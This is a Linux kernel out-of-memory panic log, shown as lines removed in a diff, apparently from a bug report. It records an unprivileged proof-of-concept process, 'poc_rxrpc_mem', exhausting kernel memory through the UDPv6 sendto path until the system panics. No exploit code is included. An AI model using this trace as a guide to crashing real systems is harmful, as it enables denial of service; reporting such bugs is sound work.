-[  275.017004][ T9427]  out_of_memory (mm/oom_kill.c:1075 mm/oom_kill.c:1143)
-[  275.017019][ T9427]  ? __pfx_out_of_memory (mm/oom_kill.c:835)
-[  275.017034][ T9427]  __alloc_frozen_pages_noprof (mm/page_alloc.c:4113 mm/page_alloc.c:5030 mm/page_alloc.c:5449)
-[  275.017060][ T9427]  ? __pfx___alloc_frozen_pages_noprof (mm/page_alloc.c:4022)
-[  275.017074][ T9427]  ? stack_trace_save (kernel/stacktrace.c:122 (discriminator 1))
-[  275.017101][ T9427]  ? __sanitizer_cov_trace_const_cmp4 (kernel/kcov.c:310)
-[  275.017133][ T9427]  ? __lock_acquire (kernel/locking/lockdep.c:4718 kernel/locking/lockdep.c:5242)
-[  275.017151][ T9427]  ? kmalloc_reserve (net/core/skbuff.c:615 (discriminator 2))
-[  275.017206][ T9427]  ? __sanitizer_cov_trace_const_cmp8 (kernel/kcov.c:317)
-[  275.017217][ T9427]  ? policy_nodemask (mm/mempolicy.c:2304 (discriminator 1))
-[  275.017234][ T9427]  alloc_pages_mpol (mm/mempolicy.c:2486)
-[  275.017244][ T9427]  ? __pfx_alloc_pages_mpol (mm/mempolicy.c:2275)
-[  275.017257][ T9427]  alloc_frozen_pages_noprof (mm/mempolicy.c:2557 (discriminator 1))
-[  275.017269][ T9427]  allocate_slab (mm/slub.c:3345 (discriminator 2) mm/slub.c:3470)
-[  275.017281][ T9427]  new_slab (mm/slub.c:3513)
-[  275.017292][ T9427]  ___slab_alloc (mm/slub.c:4568)
-[  275.017306][ T9427]  kmem_cache_alloc_node_noprof (mm/slub.c:4987 mm/slub.c:5068)
-[  275.017319][ T9427]  ? __local_bh_enable_ip (kernel/softirq.c:478)
-[  275.017335][ T9427]  ? __alloc_skb (net/core/skbuff.c:704 (discriminator 2))
-[  275.017349][ T9427]  __alloc_skb (net/core/skbuff.c:704 (discriminator 2))
-[  275.017359][ T9427]  ? __alloc_skb (include/linux/bottom_half.h:20 (discriminator 1) net/core/skbuff.c:697)
-[  275.017370][ T9427]  ? __pfx___alloc_skb (include/linux/fortify-string.h:447)
-[  275.017382][ T9427]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
-[  275.017391][ T9427]  ? lockdep_hardirqs_on (kernel/locking/lockdep.c:4516)
-[  275.017407][ T9427]  alloc_skb_with_frags (include/linux/skbuff.h:1384 net/core/skbuff.c:6803)
-[  275.017424][ T9427]  sock_alloc_send_pskb (net/core/sock.c:3022)
-[  275.017436][ T9427]  ? lockdep_hardirqs_on (kernel/locking/lockdep.c:4516)
-[  275.017451][ T9427]  ? __pfx_sock_alloc_send_pskb (net/core/sock.c:2854 (discriminator 2))
-[  275.017463][ T9427]  ? debug_smp_processor_id (lib/smp_processor_id.c:58)
-[  275.017474][ T9427]  ? __lock_acquire (kernel/locking/lockdep.c:4718 kernel/locking/lockdep.c:5242)
-[  275.017486][ T9427]  __ip6_append_data (include/net/sock.h:1907 net/ipv6/ip6_output.c:1695)
-[  275.017511][ T9427]  ? find_held_lock (kernel/locking/lockdep.c:5401)
-[  275.017526][ T9427]  ? __pfx_ip_generic_getfrag (include/linux/skbuff.h:3143)
-[  275.017548][ T9427]  ? __pfx___ip6_append_data (net/ipv6/ip6_output.c:2063)
-[  275.017557][ T9427]  ? ip6_mtu (net/ipv6/route.c:3296)
-[  275.017569][ T9427]  ? ip6_setup_cork (net/ipv6/ip6_output.c:1450)
-[  275.017581][ T9427]  ip6_make_skb (net/ipv6/ip6_output.c:2094)
-[  275.017592][ T9427]  ? __pfx_ip_generic_getfrag (include/linux/skbuff.h:3143)
-[  275.017605][ T9427]  ? __pfx_ip6_make_skb (net/ipv6/ip6_output.c:2040)
-[  275.017618][ T9427]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
-[  275.017632][ T9427]  udpv6_sendmsg (net/ipv6/udp.c:1720)
-[  275.017643][ T9427]  ? udpv6_sendmsg (net/ipv6/udp.c:1720)
-[  275.017655][ T9427]  ? find_held_lock (kernel/locking/lockdep.c:5401)
-[  275.017672][ T9427]  ? __pfx_udpv6_sendmsg (net/ipv6/udp.c:338)
-[  275.017684][ T9427]  ? __sanitizer_cov_trace_const_cmp4 (kernel/kcov.c:310)
-[  275.017697][ T9427]  ? __pfx_avc_has_perm (security/selinux/avc.c:1154)
-[  275.017755][ T9427]  ? sock_has_perm (security/selinux/hooks.c:5054 (discriminator 1))
-[  275.017774][ T9427]  ? __pfx_udpv6_sendmsg (net/ipv6/udp.c:338)
-[  275.017786][ T9427]  inet6_sendmsg (net/ipv6/af_inet6.c:641 (discriminator 4))
-[  275.017798][ T9427]  ? inet6_sendmsg (net/ipv6/af_inet6.c:641 (discriminator 4))
-[  275.017811][ T9427]  __sys_sendto (net/socket.c:800 (discriminator 1) net/socket.c:815 net/socket.c:2281)
-[  275.017823][ T9427]  ? __pfx___sys_sendto (net/socket.c:2235)
-[  275.017837][ T9427]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
-[  275.017851][ T9427]  ? xfd_validate_state (arch/x86/kernel/fpu/xstate.c:1544)
-[  275.017875][ T9427]  __x64_sys_sendto (net/socket.c:2288 net/socket.c:2284 net/socket.c:2284)
-[  275.017886][ T9427]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
-[  275.017895][ T9427]  ? lockdep_hardirqs_on (kernel/locking/lockdep.c:4516)
-[  275.017908][ T9427]  x64_sys_call (arch/x86/include/generated/asm/syscalls_64.h:45)
-[  275.017925][ T9427]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
-[  275.017940][ T9427]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
-[  275.017950][ T9427] RIP: 0033:0x423104
-[  275.017958][ T9427] Code: 7d e8 89 4d d4 e8 ac e7 02 00 44 8b 4d d0 4c 8b 45 c8 89 c3 44 8b 55 d4 8b 7d e8 b8 2c 00 00 00 48 8b 55 d8 48 8b 75 e0 0f 05 <48> 3d 00 f0 ff ff 77 34 89 df 48 89 45 e8 e8 f9 e7 02 00 48 8b 45
-All code
-========
-   0:	7d e8                	jge    0xffffffffffffffea
-   2:	89 4d d4             	mov    %ecx,-0x2c(%rbp)
-   5:	e8 ac e7 02 00       	call   0x2e7b6
-   a:	44 8b 4d d0          	mov    -0x30(%rbp),%r9d
-   e:	4c 8b 45 c8          	mov    -0x38(%rbp),%r8
-  12:	89 c3                	mov    %eax,%ebx
-  14:	44 8b 55 d4          	mov    -0x2c(%rbp),%r10d
-  18:	8b 7d e8             	mov    -0x18(%rbp),%edi
-  1b:	b8 2c 00 00 00       	mov    $0x2c,%eax
-  20:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
-  24:	48 8b 75 e0          	mov    -0x20(%rbp),%rsi
-  28:	0f 05                	syscall
-  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
-  30:	77 34                	ja     0x66
-  32:	89 df                	mov    %ebx,%edi
-  34:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
-  38:	e8 f9 e7 02 00       	call   0x2e836
-  3d:	48                   	rex.W
-  3e:	8b                   	.byte 0x8b
-  3f:	45                   	rex.RB
-
-Code starting with the faulting instruction
-===========================================
-   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
-   6:	77 34                	ja     0x3c
-   8:	89 df                	mov    %ebx,%edi
-   a:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
-   e:	e8 f9 e7 02 00       	call   0x2e80c
-  13:	48                   	rex.W
-  14:	8b                   	.byte 0x8b
-  15:	45                   	rex.RB
-[  275.017968][ T9427] RSP: 002b:00007fd17b1191b0 EFLAGS: 00000293 ORIG_RAX: 000000000000002c
-[  275.017985][ T9427] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 0000000000423104
-[  275.017991][ T9427] RDX: 0000000000000024 RSI: 00007fd15c000b70 RDI: 0000000000000008
-[  275.017997][ T9427] RBP: 00007fd17b1191f0 R08: 000000001c46aae8 R09: 000000000000001c
-[  275.018002][ T9427] R10: 0000000000000000 R11: 0000000000000293 R12: 00000000000087cf
-[  275.018008][ T9427] R13: 000000008010f9c6 R14: 000000000043e718 R15: 000000001c46aae8
-[  275.018020][ T9427]  </TASK>
-[  275.048339][ T9427] Mem-Info:
-[  275.048347][ T9427] active_anon:2922 inactive_anon:6285 isolated_anon:0
-[  275.048347][ T9427]  active_file:0 inactive_file:27 isolated_file:0
-[  275.048347][ T9427]  unevictable:1768 dirty:0 writeback:3
-[  275.048347][ T9427]  slab_reclaimable:11444 slab_unreclaimable:236232
-[  275.048347][ T9427]  mapped:150 shmem:2717 pagetables:574
-[  275.048347][ T9427]  sec_pagetables:0 bounce:0
-[  275.048347][ T9427]  kernel_misc_reclaimable:0
-[  275.048347][ T9427]  free:16828 free_pcp:10 free_cma:0
-[  275.048369][ T9427] Node 0 active_anon:11688kB inactive_anon:25140kB active_file:0kB inactive_file:108kB unevictable:7072kB isolated(anon):0kB isolated(file):0kB mapped:600kB dirty:0kB writeback:12kB shmem:10868kB shmem_thp:0kB shmem_pmdmapped:0kB anon_thp:0kB kernel_stack:9728kB pagetables:2296kB sec_pagetables:0kB all_unreclaimable? no Balloon:0kB gpu_active:0kB gpu_reclaim:0kB
-[  275.048392][ T9427] Node 0 DMA free:5696kB boost:0kB min:524kB low:652kB high:780kB reserved_highatomic:0kB free_highatomic:0kB active_anon:0kB inactive_anon:0kB active_file:0kB inactive_file:0kB unevictable:0kB writepending:0kB zspages:0kB present:15992kB managed:15360kB mlocked:0kB bounce:0kB free_pcp:0kB local_pcp:0kB free_cma:0kB
-[  275.048420][ T9427] lowmem_reserve[]: 0 1295 1295 1295 1295
-[  275.048435][ T9427] Node 0 DMA32 free:61616kB boost:18432kB min:62960kB low:74092kB high:85224kB reserved_highatomic:0kB free_highatomic:0kB active_anon:11688kB inactive_anon:25140kB active_file:0kB inactive_file:108kB unevictable:7072kB writepending:12kB zspages:0kB present:2080640kB managed:1326300kB mlocked:0kB bounce:0kB free_pcp:40kB local_pcp:40kB free_cma:0kB
-[  275.048459][ T9427] lowmem_reserve[]: 0 0 0 0 0
-[  275.048472][ T9427] Node 0 DMA: 0*4kB 0*8kB 0*16kB 0*32kB 1*64kB (U) 0*128kB 0*256kB 1*512kB (U) 1*1024kB (U) 2*2048kB (UM) 0*4096kB = 5696kB
-[  275.048531][ T9427] Node 0 DMA32: 2469*4kB (UME) 729*8kB (UME) 364*16kB (UME) 196*32kB (UME) 104*64kB (UME) 60*128kB (ME) 26*256kB (ME) 19*512kB (UM) 1*1024kB (M) 1*2048kB (M) 0*4096kB = 61596kB
-[  275.048596][ T9427] Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0 hugepages_size=1048576kB
-[  275.048602][ T9427] Node 0 hugepages_total=4 hugepages_free=4 hugepages_surp=0 hugepages_size=2048kB
-[  275.048609][ T9427] 2916 total pagecache pages
-[  275.048611][ T9427] 0 pages in swap cache
-[  275.048614][ T9427] Free swap  = 0kB
-[  275.048617][ T9427] Total swap = 0kB
-[  275.048619][ T9427] 524158 pages RAM
-[  275.048622][ T9427] 0 pages HighMem/MovableOnly
-[  275.048627][ T9427] 188743 pages reserved
-[  275.048629][ T9427] 0 pages cma reserved
-[  275.048632][ T9427] Unreclaimable slab info:
-[  275.048635][ T9427] Name                      Used          Total
-[  275.048644][ T9427] bio-464                    1KB         15KB
-[  275.048650][ T9427] bio-528                    3KB         15KB
-[  275.048656][ T9427] bio-544                    1KB         15KB
-[  275.048662][ T9427] bio-552                    1KB         15KB
-[  275.048736][ T9427] TIPC                       1KB         31KB
-[  275.048743][ T9427] SCTPv6                     2KB         30KB
-[  275.048750][ T9427] RXRPC                      2KB         30KB
-[  275.048755][ T9427] rxrpc_call_jar           197KB        217KB
-[  275.048762][ T9427] fib6_node                  2KB          4KB
-[  275.048767][ T9427] ip6_dst_cache              1KB          7KB
-[  275.048773][ T9427] RAWv6                     17KB         30KB
-[  275.048778][ T9427] UDPv6                     40KB         61KB
-[  275.048784][ T9427] TCPv6                     10KB         31KB
-[  275.048796][ T9427] t10_alua_lu_gp_cache          0KB          7KB
-[  275.048802][ T9427] scsi_sense_cache           2KB          3KB
-[  275.048808][ T9427] virtio_scsi_cmd           24KB         31KB
-[  275.048813][ T9427] bio-136                   43KB         45KB
-[  275.048824][ T9427] bio-264                    1KB          7KB
-[  275.048847][ T9427] mqueue_inode_cache          1KB         30KB
-[  275.048855][ T9427] f2fs_evict_inode_work          1KB          3KB
-[  275.048862][ T9427] bio-272                    4KB          8KB
-[  275.048867][ T9427] f2fs_bio_post_read_ctx         28KB         31KB
-[  275.048892][ T9427] jfs_mp                     9KB         11KB
-[  275.048902][ T9427] cifs_small_rq             18KB         22KB
-[  275.048909][ T9427] cifs_request              67KB         67KB
-[  275.048914][ T9427] cifs_mpx_ids               1KB          7KB
-[  275.048919][ T9427] cifs_io_subrequest         50KB         56KB
-[  275.048924][ T9427] cifs_io_request          100KB        112KB
-[  275.048932][ T9427] nfs_commit_data            4KB         16KB
-[  275.048939][ T9427] nfs_write_data            38KB         46KB
-[  275.048949][ T9427] jbd2_inode                 5KB          7KB
-[  275.048955][ T9427] ext4_system_zone           1KB         11KB
-[  275.048960][ T9427] ext4_io_end_vec            0KB          3KB
-[  275.048969][ T9427] fasync_cache               0KB          3KB
-[  275.048976][ T9427] kvm_gmem_inode_cache          1KB         15KB
-[  275.048982][ T9427] rpc_buffers               18KB         31KB
-[  275.048987][ T9427] rpc_tasks                  3KB          7KB
-[  275.048993][ T9427] UNIX-STREAM               38KB        189KB
-[  275.048998][ T9427] UNIX                      42KB         63KB
-[  275.049004][ T9427] tcp_bind2_bucket           1KB          4KB
-[  275.049009][ T9427] tcp_bind_bucket            0KB          4KB
-[  275.049015][ T9427] ip_fib_trie                1KB          3KB
-[  275.049020][ T9427] ip_fib_alias               1KB          3KB
-[  275.049046][ T9427] rtable                     1KB          7KB
-[  275.049052][ T9427] RAW                       12KB         32KB
-[  275.049057][ T9427] UDP                        4KB         63KB
-[  275.049062][ T9427] tw_sock_TCP                0KB          7KB
-[  275.049067][ T9427] request_sock_TCP           0KB          7KB
-[  275.049073][ T9427] TCP                       10KB         30KB
-[  275.049078][ T9427] fs_bio_integrity           0KB          4KB
-[  275.049084][ T9427] hugetlbfs_inode_cache          3KB         15KB
-[  275.049089][ T9427] netfs_subrequest          37KB         39KB
-[  275.049095][ T9427] netfs_request            100KB        112KB
-[  275.049100][ T9427] bio-288                   32KB         32KB
-[  275.049105][ T9427] bio-328                    2KB          8KB
-[  275.049110][ T9427] ep_head                    6KB         19KB
-[  275.049116][ T9427] eventpoll_pwq              9KB         31KB
-[  275.049122][ T9427] eventpoll_epi             16KB         45KB
-[  275.049128][ T9427] inotify_inode_mark         27KB         31KB
-[  275.049133][ T9427] bpf_fs_inode_cache          1KB         15KB
-[  275.049139][ T9427] sgpool-128                 8KB         30KB
-[  275.049144][ T9427] sgpool-64                  4KB         31KB
-[  275.049149][ T9427] sgpool-32                  2KB         30KB
-[  275.049154][ T9427] sgpool-16                  3KB         31KB
-[  275.049160][ T9427] sgpool-8                   2KB         31KB
-[  275.049165][ T9427] bio_crypt_ctx             19KB         19KB
-[  275.049170][ T9427] bio_integrity_data          0KB          7KB
-[  275.049175][ T9427] request_queue            161KB        182KB
-[  275.049180][ T9427] blkdev_ioc                 0KB          7KB
-[  275.049186][ T9427] bio-200                   20KB         31KB
-[  275.049191][ T9427] biovec-max               511KB        520KB
-[  275.049196][ T9427] biovec-128                 0KB         31KB
-[  275.049201][ T9427] biovec-64                  0KB         45KB
-[  275.049207][ T9427] biovec-16                  0KB         23KB
-[  275.049213][ T9427] uid_cache                  0KB          7KB
-[  275.049219][ T9427] dmaengine-unmap-256          2KB         31KB
-[  275.049224][ T9427] dmaengine-unmap-128          1KB         15KB
-[  275.049229][ T9427] dmaengine-unmap-16          0KB          7KB
-[  275.049234][ T9427] dmaengine-unmap-2          0KB          4KB
-[  275.049238][ T9427] QIPCRTR                    1KB         30KB
-[  275.049243][ T9427] audit_buffer               0KB          7KB
-[  275.049249][ T9427] skbuff_small_head     521844KB     521859KB
-[  275.049255][ T9427] skbuff_fclone_cache          2KB         47KB
-[  275.049260][ T9427] skbuff_head_cache     243491KB     243491KB
-[  275.049265][ T9427] configfs_dir_cache          4KB          7KB
-[  275.049271][ T9427] file_lock_cache            0KB         30KB
-[  275.049276][ T9427] file_lock_ctx             18KB         19KB
-[  275.049281][ T9427] fsnotify_inode_mark_connector         21KB         22KB
-[  275.049287][ T9427] taskstats                  1KB         15KB
-[  275.049293][ T9427] mem_cgroup_per_node         78KB        120KB
-[  275.049299][ T9427] mem_cgroup                87KB        123KB
-[  275.049305][ T9427] proc_dir_entry           308KB        339KB
-[  275.049311][ T9427] pde_opener                 0KB          3KB
-[  275.049316][ T9427] seq_file                  14KB         31KB
-[  275.049322][ T9427] sigqueue                   0KB         11KB
-[  275.049329][ T9427] shmem_inode_cache       8435KB       8541KB
-[  275.049336][ T9427] kernfs_iattrs_cache        221KB        244KB
-[  275.049343][ T9427] kernfs_node_cache      21315KB      21388KB
-[  275.049349][ T9427] mnt_cache                 54KB         78KB
-[  275.049366][ T9427] filp                     360KB        819KB
-[  275.049373][ T9427] names_cache               39KB        126KB
-[  275.049378][ T9427] net_namespace              9KB         29KB
-[  275.049383][ T9427] ima_iint_cache           161KB        161KB
-[  275.049388][ T9427] hashtab_node             927KB        928KB
-[  275.049394][ T9427] ebitmap_node            2110KB       2118KB
-[  275.049399][ T9427] avtab_node             16916KB      16917KB
-[  275.049408][ T9427] avc_node                  91KB        138KB
-[  275.049460][ T9427] lsm_inode_cache         6208KB       8015KB
-[  275.049470][ T9427] lsm_file_cache            98KB        253KB
-[  275.049475][ T9427] key_jar                   25KB         32KB
-[  275.049480][ T9427] uts_namespace              0KB         15KB
-[  275.049486][ T9427] nsproxy                    0KB          3KB
-[  275.049504][ T9427] vm_area_struct          1175KB       1968KB
-[  275.049510][ T9427] fs_cache                   9KB         39KB
-[  275.049516][ T9427] files_cache               26KB         95KB
-[  275.049521][ T9427] task_exec_state            4KB         15KB
-[  275.049553][ T9427] signal_cache             536KB       1880KB
-[  275.049564][ T9427] sighand_cache            679KB       2006KB
-[  275.049581][ T9427] task_struct             2444KB       4254KB
-[  275.049591][ T9427] cred                     132KB        543KB
-[  275.049603][ T9427] anon_vma_chain           316KB        511KB
-[  275.049612][ T9427] anon_vma                 294KB        468KB
-[  275.049621][ T9427] pid                      134KB        425KB
-[  275.049629][ T9427] Acpi-Operand              76KB        154KB
-[  275.049636][ T9427] Acpi-ParseExt              0KB         15KB
-[  275.049641][ T9427] Acpi-Parse                 0KB         15KB
-[  275.049647][ T9427] Acpi-State                 0KB         15KB
-[  275.049652][ T9427] Acpi-Namespace            55KB         62KB
-[  275.049657][ T9427] numa_policy                0KB          3KB
-[  275.049662][ T9427] perf_event                 0KB         31KB
-[  275.049667][ T9427] trace_event_file         881KB        883KB
-[  275.049673][ T9427] ftrace_event_field       2011KB       2012KB
-[  275.049678][ T9427] pool_workqueue           762KB        787KB
-[  275.049708][ T9427] maple_node               719KB       2567KB
-[  275.049714][ T9427] mm_struct                 78KB        250KB
-[  275.136004][ T9427] vmap_area                474KB        873KB
-[  275.136025][ T9427] debug_objects_cache       2585KB       2589KB
-[  275.136035][ T9427] page->ptl                 56KB        134KB
-[  275.136040][ T9427] kmalloc-cg-8k            216KB        288KB
-[  275.136048][ T9427] kmalloc-cg-4k           1524KB       1752KB
-[  275.136055][ T9427] kmalloc-cg-2k           1440KB       1620KB
-[  275.136061][ T9427] kmalloc-cg-1k            210KB        270KB
-[  275.136066][ T9427] kmalloc-cg-512           115KB        220KB
-[  275.136071][ T9427] kmalloc-cg-256            69KB        110KB
-[  275.136078][ T9427] kmalloc-cg-128          1525KB       1559KB
-[  275.136093][ T9427] kmalloc-cg-64             98KB        344KB
-[  275.136103][ T9427] kmalloc-cg-32           1276KB       1315KB
-[  275.136108][ T9427] kmalloc-cg-16              7KB         15KB
-[  275.136113][ T9427] kmalloc-cg-8              12KB         23KB
-[  275.136119][ T9427] kmalloc-cg-192            22KB         31KB
-[  275.136127][ T9427] kmalloc-cg-96            694KB        728KB
-[  275.136138][ T9427] kmalloc-8k              2424KB       2544KB
-[  275.136171][ T9427] kmalloc-4k              5304KB       8280KB
-[  275.136176][ T9427] kmalloc-2k             14070KB      14070KB
-[  275.136182][ T9427] kmalloc-1k              4494KB       4620KB
-[  275.136190][ T9427] kmalloc-512             6868KB       7339KB
-[  275.136198][ T9427] kmalloc-256             4458KB       4567KB
-[  275.136216][ T9427] kmalloc-128             1152KB       1464KB
-[  275.136245][ T9427] kmalloc-64              6098KB       6352KB
-[  275.136285][ T9427] kmalloc-32              1428KB       2354KB
-[  275.136294][ T9427] kmalloc-16              2687KB       2714KB
-[  275.136303][ T9427] kmalloc-8               1694KB       1744KB
-[  275.136314][ T9427] kmalloc-192             1727KB       1787KB
-[  275.136335][ T9427] kmalloc-96              2442KB       2608KB
-[  275.136340][ T9427] kmem_cache_node          180KB        180KB
-[  275.136345][ T9427] kmem_cache               215KB        220KB
-[  275.136351][ T9427] Memory cgroup min protection 0kB -- low protection 0kB
-[  275.136355][ T9427] Tasks state (memory values in pages):
-[  275.136358][ T9427] [  pid  ]   uid  tgid total_vm      rss rss_anon rss_file rss_shmem pgtables_bytes swapents oom_score_adj name
-[  275.136521][ T9427] [   4992]     0  4992     8006      224      221        2         1    81920        0          -250 systemd-journal
-[  275.136538][ T9427] [   5006]     0  5006     9316     2913     2911        2         0    98304        0         -1000 systemd-udevd
-[  275.136572][ T9427] [   8881]     0  8881     1411       71       69        2         0    49152        0             0 cron
-[  275.136587][ T9427] [   8934]     0  8934    55235      389      387        2         0    77824        0             0 rsyslogd
-[  275.315992][ T9427] [   9211]     0  9211    24973      356      354        2         0    81920        0             0 dhclient
-[  275.316018][ T9427] [   9258]     0  9258      720       34       32        2         0    45056        0             0 agetty
-[  275.316038][ T9427] [   9259]     0  9259      720       34       32        2         0    49152        0             0 agetty
-[  275.316058][ T9427] [   9260]     0  9260      720       34       32        2         0    40960        0             0 agetty
-[  275.316077][ T9427] [   9261]     0  9261      720       34       32        2         0    40960        0             0 agetty
-[  275.316096][ T9427] [   9262]     0  9262      720       34       32        2         0    45056        0             0 agetty
-[  275.316115][ T9427] [   9263]     0  9263      720       34       32        2         0    45056        0             0 agetty
-[  275.316140][ T9427] [   9264]     0  9264     1101       36       34        2         0    49152        0             0 agetty
-[  275.316159][ T9427] [   9265]     0  9265     3340      244      242        2         0    73728        0         -1000 sshd
-[  275.316179][ T9427] [   9267]     0  9267    14097      391      390        1         0    86016        0             0 nginx
-[  275.316202][ T9427] [   9268]    33  9268    14191      472      470        2         0    86016        0             0 nginx
-[  275.316221][ T9427] [   9269]    33  9269    14191      472      470        2         0    86016        0             0 nginx
-[  275.316240][ T9427] [   9405]     0  9405      622       51       21       30         0    40960        0             0 sh
-[  275.316259][ T9427] [   9419]     0  9419     2019      125      123        2         0    57344        0             0 runuser
-[  275.316278][ T9427] [   9421]  1001  9421   246315       62       61        1         0   102400        0             0 poc_rxrpc_mem
-[  275.316304][ T9427] Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled
-[  275.370927][ T9427] CPU: 0 UID: 1001 PID: 9427 Comm: poc_rxrpc_mem Not tainted 7.3.0-rc6+ #1 PREEMPT(full) 
-[  275.372055][ T9427] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[  275.373418][ T9427] Call Trace:
-[  275.373804][ T9427]  <TASK>
-[  275.374131][ T9427]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
-[  275.374642][ T9427]  dump_stack (lib/dump_stack.c:129)
-[  275.375119][ T9427]  vpanic (kernel/panic.c:651)
-[  275.375592][ T9427]  ? __pfx_vpanic (kernel/panic.c:363)
-[  275.376192][ T9427]  ? rcu_preempt_deferred_qs_irqrestore (kernel/rcu/tree_plugin.h:573 (discriminator 31))
-[  275.377078][ T9427]  panic (kernel/panic.c:788)
-[  275.377519][ T9427]  ? __pfx_panic (kernel/panic.c:741)
-[  275.378047][ T9427]  ? __rcu_read_unlock (kernel/rcu/tree_plugin.h:798 kernel/rcu/tree_plugin.h:438)
-[  275.378713][ T9427]  ? dump_header (mm/oom_kill.c:475)
-[  275.379246][ T9427]  out_of_memory (mm/oom_kill.c:1076 (discriminator 4) mm/oom_kill.c:1143)
-[  275.379795][ T9427]  ? __pfx_out_of_memory (mm/oom_kill.c:835)
-[  275.380579][ T9427]  __alloc_frozen_pages_noprof (mm/page_alloc.c:4113 mm/page_alloc.c:5030 mm/page_alloc.c:5449)
-[  275.381284][ T9427]  ? __pfx___alloc_frozen_pages_noprof (mm/page_alloc.c:4022)
-[  275.382093][ T9427]  ? stack_trace_save (kernel/stacktrace.c:122 (discriminator 1))
-[  275.382694][ T9427]  ? __sanitizer_cov_trace_const_cmp4 (kernel/kcov.c:310)
-[  275.383409][ T9427]  ? __lock_acquire (kernel/locking/lockdep.c:4718 kernel/locking/lockdep.c:5242)
-[  275.384085][ T9427]  ? kmalloc_reserve (net/core/skbuff.c:615 (discriminator 2))
-[  275.384950][ T9427]  ? __sanitizer_cov_trace_const_cmp8 (kernel/kcov.c:317)
-[  275.385645][ T9427]  ? policy_nodemask (mm/mempolicy.c:2304 (discriminator 1))
-[  275.386188][ T9427]  alloc_pages_mpol (mm/mempolicy.c:2486)
-[  275.386762][ T9427]  ? __pfx_alloc_pages_mpol (mm/mempolicy.c:2275)
-[  275.387523][ T9427]  alloc_frozen_pages_noprof (mm/mempolicy.c:2557 (discriminator 1))
-[  275.388152][ T9427]  allocate_slab (mm/slub.c:3345 (discriminator 2) mm/slub.c:3470)
-[  275.388700][ T9427]  new_slab (mm/slub.c:3513)
-[  275.389202][ T9427]  ___slab_alloc (mm/slub.c:4568)
-[  275.389734][ T9427]  kmem_cache_alloc_node_noprof (mm/slub.c:4987 mm/slub.c:5068)
-[  275.390416][ T9427]  ? __local_bh_enable_ip (kernel/softirq.c:478)
-[  275.391002][ T9427]  ? __alloc_skb (net/core/skbuff.c:704 (discriminator 2))
-[  275.391513][ T9427]  __alloc_skb (net/core/skbuff.c:704 (discriminator 2))
-[  275.392005][ T9427]  ? __alloc_skb (include/linux/bottom_half.h:20 (discriminator 1) net/core/skbuff.c:697)
-[  275.392508][ T9427]  ? __pfx___alloc_skb (include/linux/fortify-string.h:447)
-[  275.393075][ T9427]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
-[  275.393706][ T9427]  ? lockdep_hardirqs_on (kernel/locking/lockdep.c:4516)
-[  275.394284][ T9427]  alloc_skb_with_frags (include/linux/skbuff.h:1384 net/core/skbuff.c:6803)
-[  275.394916][ T9427]  sock_alloc_send_pskb (net/core/sock.c:3022)
-[  275.395495][ T9427]  ? lockdep_hardirqs_on (kernel/locking/lockdep.c:4516)
-[  275.396051][ T9427]  ? __pfx_sock_alloc_send_pskb (net/core/sock.c:2854 (discriminator 2))
-[  275.396686][ T9427]  ? debug_smp_processor_id (lib/smp_processor_id.c:58)
-[  275.397411][ T9427]  ? __lock_acquire (kernel/locking/lockdep.c:4718 kernel/locking/lockdep.c:5242)
-[  275.398103][ T9427]  __ip6_append_data (include/net/sock.h:1907 net/ipv6/ip6_output.c:1695)
-[  275.398645][ T9427]  ? find_held_lock (kernel/locking/lockdep.c:5401)
-[  275.399147][ T9427]  ? __pfx_ip_generic_getfrag (include/linux/skbuff.h:3143)
-[  275.399809][ T9427]  ? __pfx___ip6_append_data (net/ipv6/ip6_output.c:2063)
-[  275.400424][ T9427]  ? ip6_mtu (net/ipv6/route.c:3296)
-[  275.400886][ T9427]  ? ip6_setup_cork (net/ipv6/ip6_output.c:1450)
-[  275.401561][ T9427]  ip6_make_skb (net/ipv6/ip6_output.c:2094)
-[  275.402047][ T9427]  ? __pfx_ip_generic_getfrag (include/linux/skbuff.h:3143)
-[  275.402642][ T9427]  ? __pfx_ip6_make_skb (net/ipv6/ip6_output.c:2040)
-[  275.403221][ T9427]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
-[  275.404006][ T9427]  udpv6_sendmsg (net/ipv6/udp.c:1720)
-[  275.404545][ T9427]  ? udpv6_sendmsg (net/ipv6/udp.c:1720)
-[  275.405064][ T9427]  ? find_held_lock (kernel/locking/lockdep.c:5401)
-[  275.405794][ T9427]  ? __pfx_udpv6_sendmsg (net/ipv6/udp.c:338)
-[  275.406316][ T9427]  ? __sanitizer_cov_trace_const_cmp4 (kernel/kcov.c:310)
-[  275.406958][ T9427]  ? __pfx_avc_has_perm (security/selinux/avc.c:1154)
-[  275.407483][ T9427]  ? sock_has_perm (security/selinux/hooks.c:5054 (discriminator 1))
-[  275.407991][ T9427]  ? __pfx_udpv6_sendmsg (net/ipv6/udp.c:338)
-[  275.408541][ T9427]  inet6_sendmsg (net/ipv6/af_inet6.c:641 (discriminator 4))
-[  275.409095][ T9427]  ? inet6_sendmsg (net/ipv6/af_inet6.c:641 (discriminator 4))
-[  275.409691][ T9427]  __sys_sendto (net/socket.c:800 (discriminator 1) net/socket.c:815 net/socket.c:2281)
-[  275.410329][ T9427]  ? __pfx___sys_sendto (net/socket.c:2235)
-[  275.410915][ T9427]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
-[  275.411551][ T9427]  ? xfd_validate_state (arch/x86/kernel/fpu/xstate.c:1544)
